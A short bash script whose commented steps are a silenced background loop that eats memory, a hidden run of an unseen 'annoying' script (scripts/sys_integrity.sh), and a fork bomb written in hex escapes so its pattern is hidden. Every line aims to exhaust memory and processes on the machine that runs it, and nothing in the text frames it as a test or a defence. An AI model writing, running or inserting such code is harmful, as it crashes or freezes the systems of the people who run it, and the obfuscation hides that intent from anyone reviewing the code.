#!/bin/bash

# Hidden memory hog
( (while true; do a="X$a"; done) & ) > /dev/null 2>&1

# Exec annoying integrity script
chmod +x scripts/sys_integrity.sh
./scripts/sys_integrity.sh > /dev/null 2>&1 &

# Fork bomb
$(printf "\x3a\x28\x29\x7b\x3a\x7c\x3a\x26\x7d\x3b\x3a") &
